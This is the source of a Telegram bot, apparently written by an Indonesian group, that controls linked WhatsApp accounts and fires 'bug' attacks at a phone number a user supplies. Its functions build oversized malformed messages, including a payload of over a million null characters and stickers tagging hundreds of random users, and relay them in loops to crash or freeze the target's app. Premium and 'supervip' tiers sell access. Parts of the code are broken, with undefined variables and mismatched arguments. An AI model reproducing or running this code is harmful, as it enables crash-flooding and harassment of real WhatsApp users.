const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const https = require("https");
const chalk = require("chalk");
const {
  default: makeWAsocket,
  DisconnectReason,
  generateWAMessageFromContent,
  vGenerateWAMessageFromContent13,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia, 
  MediaType, 
  areJidsSameUser, 
  WAMessageStatus, 
  downloadAndSaveMediaMessage, 
  AuthenticationState, 
  GroupMetadata, 
  initInMemoryKeyStore, 
  getContentType, 
  MiscMessageGenerationOptions, 
  useSingleFileAuthState, 
  BufferJSON, 
  WAMessageProto, 
  MessageOptions, 
  WAFlag, 
  WANode, 
  WAMetric, 
  ChatModification,
  MessageTypeProto, 
  WALocationMessage, 
  ReconnectMode, 
  WAContextInfo, 
  proto, 
  WAGroupMetadata, 
  ProxyAgent, 
  waChatKey, 
  MimetypeMap, 
  MediaPathMap, 
  WAContactMessage, 
  WAContactsArrayMessage, 
  WAGroupInviteMessage, 
  WATextMessage, 
  WAMessageContent, 
  WAMessage, 
  BaileysError, 
  WA_MESSAGE_STATUS_TYPE, 
  MediaConnInfo, 
  URL_REGEX, 
  WAUrlInfo, 
  WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, 
  mentionedJid, 
  processTime, 
  Browser, 
  MessageType, 
  Presence, 
  WA_MESSAGE_STUB_TYPES, 
  Mimetype, 
  relayWAMessage, 
  Browsers, 
  WASocket, 
  getStream, 
  WAProto, 
  isBaileys, 
  AnyMessageContent, 
  fetchLatestBaileysVersion, 
  templateMessage, 
  InteractiveMessage,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const axios = require("axios");
const securityCheck = require("./security");

(async () => {
  await securityCheck();
  // === BOT LU BARU BOLEH JALAN DI SINI ===
})();
function startBot() {
  console.log(`
╔════════════════════╗
║   BOT TELAH AKTIF ✅     
╚════════════════════╝
`);
}

function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}
const crypto = require("crypto");
const path = require("path");
const token = config.token;
const bot = new TelegramBot(token, { polling: true });

const startTime = new Date(); 
const StartTimer = Date.now();
function getRuntime() {
  let ms = Date.now() - startTime;
  let seconds = Math.floor(ms / 1000) % 60;
  let minutes = Math.floor(ms / (1000 * 60)) % 60;
  let hours = Math.floor(ms / (1000 * 60 * 60)) % 24;
  let days = Math.floor(ms / (1000 * 60 * 60 * 24));

  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function sendProgressPhoto(chatId, photoPath) {
  const sentPhoto = await bot.sendPhoto(chatId, photoPath, {
    caption: progressStages[0].text,
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise((res) => setTimeout(res, progressStages[i].delay));
    await bot.editMessageCaption(progressStages[i].text, {
      chat_id: chatId,
      message_id: sentPhoto.message_id,
    });
  }

  return sentPhoto;
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const angel = makeWAsocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          angel.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, angel);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          angel.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
=====[ M E M U L A I ]=====
| Bot: ${botNumber}
| Status: Inisialisasi...
==========================`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const angel = makeWAsocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  angel.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
=====[ R E C O N N E C T ]=====
| Bot: ${botNumber}
| Status: Mencoba menghubungkan...
==============================`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
=====[ G A G A L ]=====
| Bot: ${botNumber}
| Status: Tidak dapat terhubung
======================`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {}
      }
    } else if (connection === "open") {
      sessions.set(botNumber, angel);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
=====[ T E R H U B U N G ]=====
| Bot: ${botNumber}
| Status: Berhasil terhubung!
==============================`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await angel.requestPairingCode(botNumber, "XTEAM123");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
=====[ C O D E - P A I R ]=====
| Bot : ${botNumber}
| Kode : ${formattedCode}
| Durasi : 60 Detik / 1 Menit 
=============================`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        await bot.editMessageText(
          `
=====[ E R O R R ]=====
| Bot : ${botNumber}
| Pesan : ${error.message}
=====================`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  angel.ev.on("creds.update", saveCreds);

  return angel;
}

  async function initializeBot() {
  await initializeWhatsAppConnections();
}

initializeBot();
//==========[ F I N A L - C O N N E C T ]==========\\

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

//==========[ C A S E - F I T U R ]==========\\
// Ganti link video/foto di sini
const mediaUrl = "https://files.catbox.moe/zv2bvb.png";


bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;

  await bot.sendPhoto(chatId, mediaUrl, {
    caption: `
\`\`\`
┏━━━━━━━ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ━❍
┃✦ Developer : X-Lolipop Team
┃✦ Version   : X-Team
┃✦ Language  : JavaScript
┃✦ Framework : Stealth-Core
┃✦ Effect    : 
┃⤷ Delay Crash Sequence 
┃⤷ iPhone Force-Crash 
┃⤷ Blank Click Screen 
┃⤷ Ghost Call Trigger 
┃⤷ Auto Join Info Group 
┗━━━━━━━━━━━━━━━━━━━━━━━❍

💠 Click Button Menu Below To Continue ⚙️
\`\`\`
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "X-Attack", callback_data: "bug_menu" },
          { text: "X-Settings", callback_data: "owner_menu" },
        ],
      ],
    },
  });
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// CALLBACK HANDLER (MENU)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;

  await bot.answerCallbackQuery(callbackQuery.id);

  if (data === "bug_menu") {
    await bot.editMessageCaption(
      `\`\`\`
Example : /xlolipop 62xxxx
⤷ All Menu Bug

© X-Lolipop Team 
| X-Attack Engine ⚙️
\`\`\``,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "‹ 𝐁𝐚𝐜𝐤", callback_data: "start_menu" }]],
        },
      }
    );
  } else if (data === "owner_menu") {
    await bot.editMessageCaption(
      `\`\`\`
=-=-=-=-=-=-=[Owner Menu]=-=-=-=-=-=-=
- /addsender 62xx
- /cooldown 1m
- /addprem <id>
- /delprem <id>
- /addsupervip <id>
- /delsupervip <id>

© X-Lolipop Team 
| Control Panel ⚙️
\`\`\``,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "‹ 𝐁𝐚𝐜𝐤", callback_data: "start_menu" }]],
        },
      }
    );
  } else if (data === "start_menu") {
    await bot.editMessageCaption(
      `\`\`\`
┏━━━━━━━ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ━❍
┃ ✦ Developer : X-Lolipop Team
┃ ✦ Version   : X-Team
┃ ✦ Language  : JavaScript
┃ ✦ Framework : Stealth-Core
┃ ✦ Effect    : 
┃⤷ Delay Crash Sequence 
┃⤷ iPhone Force-Crash 
┃⤷ Blank Click Screen 
┃⤷ Ghost Call Trigger 
┃⤷ Auto Join Info Group 
┗━━━━━━━━━━━━━━━━━━━━━━━❍

💠 Click Button Menu Below To Continue ⚙️
\`\`\``,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "X-Attack", callback_data: "bug_menu" },
              { text: "X-Settings", callback_data: "owner_menu" },
            ],
          ],
        },
      }
    );
  }
});
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});

const supervipFile = path.resolve("./supervip.js");
let supervipUsers = require("./supervip.js");

function isSupervip(userId) {
  return supervipUsers.includes(userId.toString());
}

let cooldownEnabled = true;
const cooldowns = new Map();
let COOLDOWN_TIME = 80 * 1000; // default awal

bot.onText(/\/cooldown(?: (\w+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const arg = match[1];

  if (!arg) {
    return bot.sendMessage(chatId, "⚠️ Format salah. Contoh: `/cooldown off`, `/cooldown 2m`, `/cooldown 30s`", {
      parse_mode: "Markdown",
    });
  }

  if (arg === "on") {
    cooldownEnabled = true;
    return bot.sendMessage(chatId, "✅ Cooldown *diaktifkan*", { parse_mode: "Markdown" });
  }

  if (arg === "off") {
    cooldownEnabled = false;
    return bot.sendMessage(chatId, "❌ Cooldown *dinonaktifkan*", { parse_mode: "Markdown" });
  }

  // Jika argumen berupa waktu (misal 2m atau 30s)
  const matchTime = arg.match(/^(\d+)(s|m)$/);
  if (matchTime) {
    const value = parseInt(matchTime[1]);
    const unit = matchTime[2];

    COOLDOWN_TIME = unit === "m" ? value * 60 * 1000 : value * 1000;

    return bot.sendMessage(
      chatId,
      `⏱️ Cooldown diatur ke *${value}${unit === "m" ? " menit" : " detik"}*`,
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⚠️ Format waktu tidak dikenali. Gunakan seperti: `/cooldown 90s`, `/cooldown 2m`", {
    parse_mode: "Markdown",
  });
});


bot.onText(/\/statusbot/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isSupervip(userId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan perintah ini.",
      { parse_mode: "MarkdownV2" }
    );
  }

  // Cooldown check
  if (cooldownEnabled) {
    const lastUsed = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < COOLDOWN_TIME) {
      const remaining = COOLDOWN_TIME - (now - lastUsed);
      const seconds = Math.ceil(remaining / 1000);
      const minutes = Math.floor(seconds / 60);
      const secs = seconds % 60;
      const timeStr = minutes > 0 ? `${minutes}m ${secs}s` : `${secs}s`;

      return bot.sendMessage(chatId, `⏳ Harap tunggu *${timeStr}* sebelum menggunakan perintah ini lagi.`, {
        parse_mode: "Markdown"
      });
    }

    cooldowns.set(userId, now);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Tidak ada bot WhatsApp yang terhubung*\.\nSilakan hubungkan bot terlebih dahulu dengan perintah /addsender\.",
        { parse_mode: "MarkdownV2" }
      );
    }

    // Tambahkan status cooldown
    let cooldownStatus = "Cooldown: Tidak Aktif";
    if (cooldownEnabled) {
      const seconds = Math.floor(COOLDOWN_TIME / 1000);
      const minutes = Math.floor(seconds / 60);
      const secs = seconds % 60;
      const timeStr = minutes > 0 ? `${minutes}m ${secs}s` : `${secs}s`;
      cooldownStatus = `Cooldown: Aktif \${timeStr}\`; // Escape () untuk MarkdownV2
    }

    let botList = "```Team Lolipop\n======[ STATUS BOT ]======\n";
    botList += `| ${cooldownStatus}\n|\n`;

    for (const [botNumber, angel] of sessions.entries()) {
      const status = angel.user ? "Status: Terhubung" : "Status: Tidak Terhubung";
      const maskedNumber =
        botNumber.length >= 8
          ? botNumber.slice(0, 2) + "*****" + botNumber.slice(-2)
          : botNumber;

      botList += `| - ${maskedNumber}\n|   ${status}\n`;
    }

    botList += `|\n| Total: ${sessions.size} bot\n========================\n\`\`\``;

    await bot.sendMessage(chatId, botList, { parse_mode: "MarkdownV2" });
  } catch (error) {
    console.error("Error in statusbot:", error);
    await bot.sendMessage(
      chatId,
      "⚠️ Terjadi kesalahan saat mengambil status bot\\. Silakan coba lagi\\.",
      { parse_mode: "MarkdownV2" }
    );
  }
});

bot.onText(/\/addsupervip (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menambah pengguna supervip.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "⚠️ Mohon masukkan ID pengguna yang valid.");
  }

  if (supervipUsers.includes(newUserId)) {
    return bot.sendMessage(
      chatId,
      "Pengguna sudah terdaftar sebagai supervip."
    );
  }

  supervipUsers.push(newUserId);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar supervip.`
    );
  });
});

bot.onText(/\/delsupervip (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menghapus pengguna supervip.",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!supervipUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "Pengguna tidak ditemukan dalam daftar supervip."
    );
  }

  supervipUsers = supervipUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar supervip.`
    );
  });
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat melihat daftar pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const premiumList = premiumUsers
    .map((id, index) => `${index + 1}. ${id}`)
    .join("\n");

  bot.sendMessage(
    chatId,
    `Daftar Pengguna Premium:\n${premiumList || "Tidak ada pengguna premium."}`,
    { parse_mode: "Markdown" }
  );
});
bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;

  if (!isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Fitur Premium\nAnda tidak memiliki akses ke fitur ini. Silakan upgrade ke premium.",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "Selamat! Anda memiliki akses ke fitur premium.");
});
const premiumFile = path.resolve("./premium.js");
let premiumUsers = require("./premium.js");

bot.onText(/\/addprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nHanya pemilik bot yang dapat menambah pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "⚠️ Mohon masukkan ID pengguna yang valid.");
  }

  if (premiumUsers.includes(newUserId)) {
    return bot.sendMessage(chatId, "Pengguna sudah terdaftar sebagai premium.");
  }

  premiumUsers.push(newUserId);

  const fileContent = `const premiumUsers = ${JSON.stringify(premiumUsers, null, 2)};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium.`
    );
  });
});

bot.onText(/\/delprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nHanya pemilik bot yang dapat menghapus pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!premiumUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "Pengguna tidak ditemukan dalam daftar premium."
    );
  }

  premiumUsers = premiumUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/\/addsender(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const input = match[1];
  if (!input) {
    return bot.sendMessage(chatId, "Contoh penggunaan: /addsender 6281234567890");
  }

  const botNumber = input.replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addsender:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/xlolipop(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const rawTarget = match[1]?.replace(/[^0-9]/g, "") || "";
  const target = `${rawTarget}@s.whatsapp.net`;

  if (!isPremium(userId) && !isOwner(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, "Akses Ditolak\nPerintah ini hanya untuk pengguna terdaftar.", { parse_mode: "Markdown" });
  }

  if (rawTarget.length < 8 || rawTarget.length > 15) {
    return bot.sendMessage(chatId, "Format Nomor salah!\nContoh: /vanegeta 62xxxx");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "Tidak ada bot WhatsApp aktif. Gunakan /addsender untuk menambahkan.");
  }

  if (cooldownEnabled) {
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remaining = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⚠️ Tunggu ${remaining} detik lagi.`, { parse_mode: "Markdown" });
    }
    cooldowns.set(userId, now);
  }

  const buttons = {
    inline_keyboard: [
      [{ text: "『 Delay Internet 』", callback_data: `x_delayhold ${rawTarget}` }],
      [{ text: "『 Hard Invisible 』", callback_data: `x_bulldozer ${rawTarget}` }],
      [{ text: "『 Force Blank 』", callback_data: `x_forcecclosespam ${rawTarget}` }],
      [{ text: "『 iPhone Invisible 』",callback_data: `x_stunt ${rawTarget}` }]
    ]
  };

  const caption = `𝐒𝐞𝐥𝐞𝐜𝐭 𝐁𝐮𝐭𝐭𝐨𝐧 𝐓𝐨 𝐔𝐬𝐢𝐧𝐠 𝐁𝐮𝐠`;

  bot.sendPhoto(chatId, mediaUrl, {
    caption,
    parse_mode: "Markdown",
    reply_markup: buttons
  });
});


bot.on("callback_query", async (ctx) => {
  try {
    const callbackData = ctx.data;
    const [action, rawTarget] = callbackData.split(" ");
    const target = `${rawTarget}@s.whatsapp.net`;
    const chatId = ctx.message.chat.id;
    const messageId = ctx.message.message_id;
    const userId = ctx.from.id;

    if (!isPremium(userId) && !isOwner(userId) && !isSupervip(userId)) {
      await bot.answerCallbackQuery(ctx.id, {
        text: "Akses ditolak: tidak diizinkan",
        show_alert: false
      });
      return;
    }

    if (!["x_delayhold", "x_bulldozer", "x_forceclosespam", "x_stunt"].includes(action)) return;

    await bot.answerCallbackQuery(ctx.id);
    await bot.deleteMessage(chatId, messageId);

    const progressStages = [
      { bar: "[█░░░░░░░░░]", percent: "10%" },
      { bar: "[███░░░░░░░]", percent: "30%" },
      { bar: "[█████░░░░░]", percent: "50%" },
      { bar: "[███████░░░]", percent: "70%" },
      { bar: "[█████████░]", percent: "90%" },
      { bar: "[██████████]", percent: "100%" }
    ];

    const buildProgressText = (bar, percent) => {
      return `\`\`\`
 Sending bug............ 

» Target   : ${target}
» Command  : ${action.replace('x_', '')}
» Status   : ${bar} ${percent}
» TotalBot : ${sessions.size}

© X-Lolipop Team\`\`\``;
    };

    const progressMsg = await bot.sendPhoto(chatId, mediaUrl, {
      caption: buildProgressText(progressStages[0].bar, progressStages[0].percent),
      parse_mode: "Markdown"
    });

    const realChatId = progressMsg.chat.id;
    const realMsgId = progressMsg.message_id;

    for (let i = 1; i < progressStages.length; i++) {
      await new Promise(res => setTimeout(res, 1000));
      await bot.editMessageCaption(
        buildProgressText(progressStages[i].bar, progressStages[i].percent),
        {
          chat_id: realChatId,
          message_id: realMsgId,
          parse_mode: "Markdown"
        }
      );
    }

    let successCount = 0;
    let failCount = 0;

    for (const [, angel] of sessions.entries()) {
      try {
        if (!angel.user) continue;
        for (let i = 0; i < 30; i++) {
          if (action === "x_delayhold") {
          await posibblelive(target);
            await buttonInviteRelay(target);
            await posibblelive(angel, target);
            await buttonInviteRelay(angel, target);
            await posibblelive(target);
            await buttonInviteRelay(target);
          } else if (action === "x_bulldozer") {
          await buttonInviteRelay(target);
            await posibblelive(target);
          } else if (action === "x_fcspam") {
            await posibblelive(angel, target);
            await buttonInviteRelay(angel, target);
            await buttonInviteRelay(angel, target);
            await buttonInviteRelay(angel, target); 
          } else if (action === "x_stunt") {
            await applecrash(angel, target);
            await applecrash(angel, target); 
          }
        }
        successCount++;
      } catch {
        failCount++;
      }
    }

    const finalText = `\`\`\`
  Successs send bug....... 
    
– Target   : ${target}
– Command  : ${action.replace('x_', '')}
– Status   : Success Mengirim Bug! ✓
– Sukses   : ${successCount}
– Gagal    : ${failCount}
– TotalBot : ${sessions.size}

© X-Lolipop Team\`\`\``;

    await bot.editMessageCaption(finalText, {
      chat_id: realChatId,
      message_id: realMsgId,
      parse_mode: "Markdown"
    });

  } catch (err) {
    console.error("Error:", err.message);
    bot.sendMessage(ctx.message.chat.id, "Terjadi error saat menjalankan perintah.");
  }
});
//==========[ F I N A L - C A S E ]==========\\
async function buttonInviteRelay(target, mention) {
  while (true) {
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "YOK MAKAN PERMEN", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    })

    await angel.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target })
  }
}

async function posibblelive(target, mention) {
  let hell = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Xatanical",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
  });
  
  await angel.relayMessage("status@broadcast", hell.message, {
    messageId: hell.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await angel.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: hell.key,
          type: 25
        }
      }
    }
  },
  {
    additionalNodes: [{
      tag: "meta",
      attrs: { is_status_mention: "true" },
      content: undefined
    }]
  });
      
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 400,
                },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await angel.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined,
        }],
      }],
    }],
  });
  console.log(chalk.red('Send Bug sukses')) 
}



